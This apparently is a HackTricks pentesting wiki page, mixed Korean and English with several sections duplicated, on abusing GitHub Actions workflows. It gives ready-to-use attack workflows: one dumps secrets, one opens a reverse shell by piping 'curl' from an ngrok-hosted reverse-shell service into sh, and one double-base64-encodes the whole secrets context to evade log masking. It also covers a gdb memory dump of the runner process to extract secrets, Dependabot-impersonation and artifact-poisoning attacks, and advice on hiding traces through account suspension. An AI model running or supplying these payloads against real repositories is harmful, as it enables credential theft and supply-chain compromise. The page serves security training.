# Github Actions 악용

{{#include ../../../banners/hacktricks-training.md}}

## 도구

다음 도구들은 Github Action 워크플로우를 찾고 취약한 것들을 찾아내는 데 유용합니다:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - 또한 [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)에 있는 체크리스트도 확인하세요

## 기본 정보

이 페이지에서는 다음을 다룹니다:

- 공격자가 Github Action에 접근했을 때 발생할 수 있는 모든 영향의 **요약**
- 액션에 **접근 권한을 얻는** 다양한 방법:
  - 액션을 생성할 수 있는 **권한** 보유
  - **pull request** 관련 트리거 악용
  - 기타 **외부 접근** 기법 악용
  - 이미 침해된 repo로부터의 **Pivoting**
- 마지막으로, 내부에서 액션을 악용하기 위한 **post-exploitation 기법** 섹션(앞서 언급한 영향들을 야기)

## 영향 요약

For an introduction about [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

만약 리포지토리 내에서 **GitHub Actions에서 임의의 코드를 실행**할 수 있다면, 다음을 수행할 수 있습니다:

- 파이프라인에 마운트된 **secrets**를 탈취하고 파이프라인 권한을 **악용**하여 AWS 및 GCP와 같은 외부 플랫폼에 무단 접근할 수 있습니다.
- 배포(deployments) 및 기타 **artifacts**를 손상시킬 수 있습니다.
- 파이프라인이 자산을 배포하거나 저장하는 경우, 최종 제품을 변경하여 공급망 공격을 수행할 수 있습니다.
- 커스텀 워커(custom workers)에서 코드를 실행하여 컴퓨팅 파워를 악용하고 다른 시스템으로 pivot할 수 있습니다.
- `GITHUB_TOKEN`에 연관된 권한에 따라 리포지토리 코드를 덮어쓸 수 있습니다.

## GITHUB_TOKEN

이 "**secret**" ( `${{ secrets.GITHUB_TOKEN }}` 및 `${{ github.token }}` 에서 나오는)은 관리자가 이 옵션을 활성화할 때 부여됩니다:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

이 토큰은 **Github Application이 사용할** 것과 동일하므로, 동일한 엔드포인트에 접근할 수 있습니다: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github는 [**flow**](https://github.com/github/roadmap/issues/74)를 공개해야 합니다. 이는 GitHub 내에서 **cross-repository** 접근을 허용하여 리포지토리가 `GITHUB_TOKEN`을 사용해 다른 내부 리포지토리에 접근할 수 있게 합니다.

이 토큰의 가능한 **권한**은 다음에서 확인할 수 있습니다: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

토큰은 **작업이 완료된 후 만료**된다는 점에 유의하세요.\
이 토큰들은 다음과 같은 형태입니다: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

이 토큰으로 할 수 있는 몇 가지 흥미로운 것들:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> 여러 경우에 **github user tokens inside Github Actions envs or in the secrets**를 찾을 수 있다는 점에 유의하세요. 이러한 토큰은 repository와 organization에 대해 더 많은 권한을 부여할 수 있습니다.

<details>

<summary>List secrets in Github Action output</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secrets를 이용한 reverse shell 획득</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

다른 사용자의 리포지토리에서 Github Token에 부여된 권한은 actions의 **로그 확인**을 통해 확인할 수 있습니다:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## 허용된 실행

> [!NOTE]
> 이는 Github actions를 손상시키기 위한 가장 쉬운 방법일 것입니다. 이 경우 조직 내에서 **새 리포지토리를 생성할 수 있는 권한**, 또는 **저장소에 대한 쓰기 권한**이 있다고 가정합니다.
>
> 이 상황이라면 [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action)을 확인하면 됩니다.

### Execution from Repo Creation

조직 구성원이 **새 리포지토리를 생성할 수 있고** 당신이 github actions를 실행할 수 있는 경우, **새 리포지토리를 생성하여 조직 수준에 설정된 secrets를 탈취할 수 있습니다**.

### Execution from a New Branch

이미 Github Action이 구성된 저장소에 **새 브랜치를 생성할 수 있다면**, 해당 액션을 **수정**하고, 내용을 **업로드**한 뒤 **새 브랜치에서 해당 action을 실행**할 수 있습니다. 이 방법으로 **exfiltrate repository and organization level secrets** (단, 그 이름을 알아야 합니다).

> [!WARNING]
> workflow YAML 내부에만 구현된 제한(예: `on: push: branches: [main]`, job conditionals, 또는 manual gates)은 협력자가 편집할 수 있습니다. 외부에서 강제되지 않으면 (branch protections, protected environments, and protected tags), 기여자는 워크플로우의 실행 대상을 자신의 브랜치로 변경하여 마운트된 secrets/permissions를 악용할 수 있습니다.

수정한 액션을 **수동으로** 실행되게 하거나, **PR이 생성될 때** 또는 **코드가 푸시될 때** 실행되게 할 수 있습니다(얼마나 눈에 띄게 할지에 따라 다름):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## 포크된 실행

> [!NOTE]
> 공격자가 다른 리포지토리의 **Github Action을 실행**할 수 있게 하는 다양한 트리거가 있습니다. 이러한 트리거 가능한 action들이 잘못 구성되어 있으면 공격자가 이를 침해할 수 있습니다.

### `pull_request`

워크플로우 트리거 **`pull_request`**는 풀 리퀘스트가 수신될 때마다 워크플로우를 실행합니다. 단 몇 가지 예외가 있습니다: 기본적으로 협업이 **처음**인 경우에는 일부 **유지관리자**가 워크플로우의 **실행**을 **승인**해야 합니다:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> 기본 제한이 **처음 기여자**에 적용되므로, 유효한 버그/오타를 수정하는 PR로 기여한 후 새로 얻은 `pull_request` 권한을 남용하기 위해 **다른 PR**을 보낼 수 있습니다.
>
> **저는 이걸 테스트했지만 동작하지 않았습니다**: ~~또 다른 옵션은 프로젝트에 기여했던 사람의 이름으로 계정을 만들고 그 계정을 삭제하는 것입니다.~~

또한 기본적으로 대상 리포지토리에 대해 **쓰기 권한**과 **secrets 접근**을 허용하지 않습니다(자세한 내용은 [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) 참조):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

공격자는 Github Action 정의를 수정해 임의의 코드를 실행하거나 임의의 액션을 추가할 수 있습니다. 그러나 앞서 언급한 제한 때문에 비밀을 훔치거나 리포지토리를 덮어쓸 수는 없습니다.

> [!CAUTION]
> **네, 공격자가 PR에서 트리거될 github action을 변경하면, 사용되는 것은 원본 리포지토리의 것이 아니라 공격자의 Github Action이 됩니다!**

공격자가 실행되는 코드를 제어하기 때문에, `GITHUB_TOKEN`에 비밀이나 쓰기 권한이 없더라도 예를 들어 **악성 아티팩트 업로드** 같은 행동을 할 수 있습니다.

### **`pull_request_target`**

워크플로우 트리거 **`pull_request_target`**는 대상 리포지토리에 대한 **쓰기 권한**과 **secrets 접근**을 가지며(권한 요청을 하지 않습니다).

워크플로우 트리거 **`pull_request_target`**는 **base 컨텍스트에서 실행되며** PR에서 제공된 컨텍스트에서 실행되지 않습니다(신뢰할 수 없는 코드를 실행하지 않기 위해서입니다). `pull_request_target`에 대한 자세한 내용은 [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) 참조하세요.\
또한 이 특정 위험한 사용에 대한 자세한 내용은 이 [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)를 확인하세요.

실행되는 워크플로우가 **base**에 정의된 것이고 **PR**의 것이 아니기 때문에 **`pull_request_target`**을 사용하는 것이 **안전해 보일 수** 있지만, **안전하지 않은 몇몇 경우**가 있습니다.

그리고 이것은 **secrets에 접근**할 수 있습니다.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) 트리거는 워크플로우가 `completed`, `requested` 또는 `in_progress` 상태일 때 다른 워크플로우를 실행할 수 있게 합니다.

이 예에서는 별도의 "Run Tests" 워크플로우가 완료된 후에 워크플로우가 실행되도록 구성되어 있습니다:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

이 밖에 문서에 따르면: `workflow_run` 이벤트로 시작된 workflow는 **이전 workflow가 그렇지 않았더라도 secrets에 접근하고 토큰을 쓸 수 있습니다**.

This kind of workflow could be attacked if it's **depending** on a **workflow** that can be **triggered** by an external user via **`pull_request`** or **`pull_request_target`**. A couple of vulnerable examples can be [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** The first one consist on the **`workflow_run`** triggered workflow downloading out the attackers code: `${{ github.event.pull_request.head.sha }}`\
The second one consist on **passing** an **artifact** from the **untrusted** code to the **`workflow_run`** workflow and using the content of this artifact in a way that makes it **vulnerable to RCE**.

이런 종류의 workflow는 외부 사용자가 **`pull_request`** 또는 **`pull_request_target`**을 통해 트리거할 수 있는 **workflow**에 **종속**되어 있는 경우 공격받을 수 있습니다. 취약한 예시는 [**이 블로그**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)에서 확인할 수 있습니다. 첫 번째 예시는 **`workflow_run`**으로 트리거된 workflow가 공격자의 코드를 다운로드하는 경우입니다: `${{ github.event.pull_request.head.sha }}`\
두 번째 예시는 **신뢰할 수 없는** 코드에서 생성된 **artifact**를 **`workflow_run`** workflow로 **전달**하고, 그 artifact의 내용을 사용함으로써 **RCE에 취약**해지는 경우입니다.

### `workflow_call`

TODO

TODO: Check if when executed from a pull_request the used/downloaded code if the one from the origin or from the forked PR

## Abusing Forked Execution

We have mentioned all the ways an external attacker could manage to make a github workflow to execute, now let's take a look about how this executions, if bad configured, could be abused:

## Abusing Forked Execution

외부 공격자가 github workflow를 실행시키는 모든 방법을 언급했습니다. 이제 이러한 실행들이 잘못 구성되었을 때 어떻게 악용될 수 있는지 살펴보겠습니다.

### Untrusted checkout execution

In the case of **`pull_request`,** the workflow is going to be executed in the **context of the PR** (so it'll execute the **malicious PRs code**), but someone needs to **authorize it first** and it will run with some [limitations](#pull_request).

### Untrusted checkout execution

**`pull_request`**의 경우 workflow는 **PR의 컨텍스트**에서 실행되므로 (**악의적인 PR의 코드가 실행됩니다**). 다만 누군가 먼저 **승인해야** 하고 일부 [제한사항](#pull_request)이 적용됩니다.

In case of a workflow using **`pull_request_target` or `workflow_run`** that depends on a workflow that can be triggered from **`pull_request_target` or `pull_request`** the code from the original repo will be executed, so the **attacker cannot control the executed code**.

`pull_request_target` 또는 `workflow_run`을 사용하는 workflow가 **`pull_request_target` 또는 `pull_request`**로 트리거될 수 있는 다른 workflow에 의존하는 경우, 원본 리포지토리의 코드가 실행되므로 **공격자가 실행되는 코드를 제어할 수는 없습니다**.

> [!CAUTION]
> However, if the **action** has an **explicit PR checkou**t that will **get the code from the PR** (and not from base), it will use the attackers controlled code. For example (check line 12 where the PR code is downloaded):

> [!CAUTION]
> 다만 **action**에 **명시적인 PR checkout**이 있어 **PR의 코드**(base가 아닌)를 가져오도록 되어 있다면, 공격자가 제어하는 코드가 사용됩니다. 예를 들어(PR 코드가 다운로드되는 12번 라인을 확인하세요):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

The potentially **untrusted code is being run during `npm install` or `npm build`** as the build scripts and referenced **packages are controlled by the author of the PR**.

잠재적으로 **신뢰할 수 없는 코드가 `npm install` 또는 `npm build` 중에 실행될 수 있습니다**. 빌드 스크립트와 참조된 **패키지들이 PR 작성자에 의해 제어되기 때문**입니다.

> [!WARNING]
> A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).

> [!WARNING]
> 취약한 actions를 검색하기 위한 github dork 예: `event.pull_request pull_request_target extension:yml` 그러나 action이 불안전하게 설정되어 있어도 job을 안전하게 실행하도록 구성하는 다양한 방법이 있습니다(예: PR을 생성한 actor가 누구인지에 대한 조건문 사용).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Note that there are certain [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) whose values are **controlled** by the **user** creating the PR. If the github action is using that **data to execute anything**, it could lead to **arbitrary code execution:**

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

일부 [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)의 값은 PR을 생성하는 **사용자**에 의해 **제어**된다는 점을 주의하세요. 만약 github action이 그 **데이터를 사용해 어떤 동작을 실행**한다면, **임의 코드 실행**로 이어질 수 있습니다:

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

From the docs: You can make an **environment variable available to any subsequent steps** in a workflow job by defining or updating the environment variable and writing this to the **`GITHUB_ENV`** environment file.

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

문서에 따르면: workflow job에서 **환경 변수를 정의하거나 업데이트하고 이를 `GITHUB_ENV` 환경 파일에 기록하면**, 해당 환경 변수를 이후의 모든 단계에서 사용할 수 있게 됩니다.

If an attacker could **inject any value** inside this **env** variable, he could inject env variables that could execute code in following steps such as **LD_PRELOAD** or **NODE_OPTIONS**.

만약 공격자가 이 **env** 변수 안에 **임의의 값을 주입**할 수 있다면, **LD_PRELOAD**나 **NODE_OPTIONS**처럼 이후 단계에서 코드를 실행시킬 수 있는 환경 변수를 주입할 수 있습니다.

For example ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine a workflow that is trusting an uploaded artifact to store its content inside **`GITHUB_ENV`** env variable. An attacker could upload something like this to compromise it:

예를 들어 ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) 및 [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), 업로드된 artifact의 내용을 **`GITHUB_ENV`** 환경 변수에 저장하도록 신뢰하는 workflow를 상상해보세요. 공격자는 이를 악용하기 위해 다음과 같은 내용을 업로드할 수 있습니다:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

As indicated in [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), several organizations have a Github Action that merges any PRR from `dependabot[bot]` like in:

### Dependabot and other trusted bots

[**이 블로그 글**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest)에 따르면, 여러 조직이 `dependabot[bot]`에서 온 PR을 자동으로 병합하는 Github Action을 사용하고 있습니다. 예를 들면:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
이것은 문제가 된다. 왜냐하면 `github.actor` 필드에는 워크플로우를 트리거한 최신 이벤트를 발생시킨 사용자가 들어 있기 때문이다. 또한 `dependabot[bot]` 사용자가 PR을 수정하게 만드는 방법은 여러 가지가 있다. 예를 들어:

- Fork the victim repository
- 자신의 복사본에 malicious payload를 추가한다
- 자신의 fork에서 Dependabot을 활성화하고 오래된 dependency를 추가한다. Dependabot은 그 dependency를 수정하는 브랜치를 생성하는데, 여기에 malicious code가 포함된다.
- 그 브랜치에서 피해자 리포지토리로 Pull Request를 연다 (PR은 사용자가 생성하므로 아직 아무 일도 일어나지 않는다)
- 그런 다음 공격자는 자신의 fork에서 Dependabot이 처음 연 PR로 돌아가 `@dependabot recreate`를 실행한다
- 그 후 Dependabot이 해당 브랜치에서 몇 가지 작업을 수행하여 피해자 리포지토리의 PR을 수정하게 되고, 이로 인해 최신 이벤트를 트리거한 actor가 `dependabot[bot]`이 되어(따라서 워크플로우가 실행된다).

Moving on, what if instead of merging the Github Action would have a command injection like in:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Well, the original blogpost proposes two options to abuse this behavior being the second one:

- 대상 리포지토리를 포크하고 오래된 의존성으로 Dependabot을 활성화합니다.
- 악성 shell injeciton 코드를 포함한 새 브랜치를 만듭니다.
- 리포지토리의 기본 브랜치(default branch)를 해당 브랜치로 변경합니다.
- 이 브랜치로부터 대상 리포지토리에 PR을 생성합니다.
- 포크에서 Dependabot이 연 PR에서 `@dependabot merge`를 실행합니다.
- Dependabot은 포크된 리포지토리의 기본 브랜치에 변경사항을 병합하여 대상 리포지토리의 PR을 업데이트합니다. 이제 워크플로를 트리거한 최신 이벤트의 실행자는 `dependabot[bot]`이 되며, 악성 브랜치 이름이 사용됩니다.

### 취약한 서드파티 Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

문제는 **`path`** 파라미터가 설정되지 않으면 artifact가 현재 디렉터리에 추출되어 이후 workflow에서 사용되거나 심지어 실행될 수 있는 파일들을 덮어쓸 수 있다는 점입니다. 따라서 Artifact에 취약점이 있으면 공격자는 이를 악용해 Artifact를 신뢰하는 다른 workflows를 손상시킬 수 있습니다.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
다음 workflow로 공격할 수 있습니다:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## 기타 외부 접근

### Deleted Namespace Repo Hijacking

If an account changes it's name another user could register an account with that name after some time. If a repository had **less than 100 stars previously to the change of nam**e, Github will allow the new register user with the same name to create a **repository with the same name** as the one deleted.

> [!CAUTION]
> So if an action is using a repo from a non-existent account, it's still possible that an attacker could create that account and compromise the action.

If other repositories where using **dependencies from this user repos**, an attacker will be able to hijack them Here you have a more complete explanation: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> In this section we will talk about techniques that would allow to **pivot from one repo to another** supposing we have some kind of access on the first one (check the previous section).

### Cache Poisoning

A cache is maintained between **wokflow runs in the same branch**. Which means that if an attacker **compromise** a **package** that is then stored in the cache and **downloaded** and executed by a **more privileged** workflow he will be able to **compromise** also that workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows could use **artifacts from other workflows and even repos**, if an attacker manages to **compromise** the Github Action that **uploads an artifact** that is later used by another workflow he could **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), even if a repository or organization has a policy restricting the use of certain actions, an attacker could just download (`git clone`) and action inside the workflow and then reference it as a local action. As the policies doesn't affect local paths, **the action will be executed without any restriction.**

Example:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### OIDC를 통한 AWS 및 GCP 접근

Check the following pages:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### secrets에 접근하기 <a href="#accessing-secrets" id="accessing-secrets"></a>

스크립트에 콘텐츠를 주입하는 경우, secrets에 어떻게 접근할 수 있는지 아는 것이 중요합니다:

- secret 또는 token이 **환경 변수 (environment variable)**로 설정되어 있으면, **`printenv`**를 사용해 환경에서 직접 접근할 수 있습니다.

<details>

<summary>Github Action 출력에 secrets 나열하기</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secrets로 reverse shell 얻기</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- 비밀이 **directly in an expression**에서 사용되는 경우, 생성된 셸 스크립트는 **on-disk**에 저장되어 접근 가능해집니다.
- ```bash
cat /home/runner/work/_temp/*
```
- JavaScript actions의 경우 secrets는 environment variables를 통해 전달됩니다
- ```bash
ps axe | grep node
```
- **custom action**의 경우, 프로그램이 **argument**에서 얻은 secret을 어떻게 사용하는지에 따라 위험이 달라질 수 있습니다:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- secrets context(협업자 수준)를 통해 모든 secrets를 열거할 수 있습니다. write 권한이 있는 기여자는 어느 브랜치에서든 workflow를 수정하여 모든 repository/org/environment secrets를 덤프할 수 있습니다. GitHub의 로그 마스킹을 회피하려면 double base64를 사용하고 로컬에서 디코딩하세요:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

로컬에서 디코딩:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

팁: 테스트 중 은밀성을 위해 출력하기 전에 암호화하세요 (openssl은 GitHub-hosted runners에 미리 설치되어 있습니다).

### Self-hosted runners 악용

어떤 **Github Actions are being executed in non-github infrastructure**인지 찾으려면 Github Action 구성 yaml에서 **`runs-on: self-hosted`**를 검색하세요.

**Self-hosted** runners는 **extra sensitive information**에 접근할 수 있고, 다른 **network systems**(네트워크의 취약한 엔드포인트? metadata service?)에 접근할 수 있습니다. 또는 격리되어 파괴되더라도 **more than one action might be run at the same time** 상황에서 악의적인 액션이 다른 액션의 **steal the secrets**할 수 있습니다.

self-hosted runners에서는 메모리를 덤프하여 워크플로우의 모든 단계에서 모든 secrets를 포함한 **secrets from the \_Runner.Listener**\_\*\* process\*\*를 얻을 수 있습니다:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
자세한 내용은 [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker 이미지 레지스트리

Github actions로 Docker 이미지를 Github 내부에 **빌드하고 저장**할 수 있습니다.\\
다음 확장 섹션에서 예제를 볼 수 있습니다:

<details>

<summary>Github Action: Docker 이미지 빌드 및 푸시</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

앞선 코드에서 보았듯, Github registry는 **`ghcr.io`**에 호스팅되어 있습니다.

리포지토리에 대해 읽기 권한이 있는 사용자는 개인 액세스 토큰을 사용해 Docker Image를 다운로드할 수 있습니다:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
그런 다음, 사용자는 **leaked secrets in the Docker image layers:** 를 검색할 수 있습니다:

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Github Actions 로그의 민감한 정보

Even if **Github** try to **detect secret values** in the actions logs and **avoid showing** them, **other sensitive data** that could have been generated in the execution of the action won't be hidden. For example a JWT signed with a secret value won't be hidden unless it's [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Covering your Tracks

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) 우선, 생성된 모든 PR은 공개적으로 Github와 대상 GitHub 계정에 명확하게 표시됩니다. 기본적으로 GitHub에서는 **can’t delete a PR of the internet**, 하지만 반전이 있습니다. Github 계정이 Github에 의해 **suspended** 되면, 해당 계정의 모든 **PRs are automatically deleted** 되어 인터넷에서 제거됩니다. 따라서 활동을 숨기려면 **GitHub account suspended or get your account flagged** 상태가 되어야 합니다. 이것은 인터넷에서 GitHub의 모든 활동을 **hide all your activities** (기본적으로 모든 your exploit PR 제거) 합니다.

An organization in GitHub is very proactive in reporting accounts to GitHub. All you need to do is share “some stuff” in Issue and they will make sure your account is suspended in 12 hours :p and there you have, made your exploit invisible on github.

> [!WARNING]
> 조직이 자신들이 표적이 되었는지 파악할 수 있는 유일한 방법은 SIEM의 GitHub 로그를 확인하는 것입니다. GitHub UI에서는 PR이 제거되기 때문입니다.

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
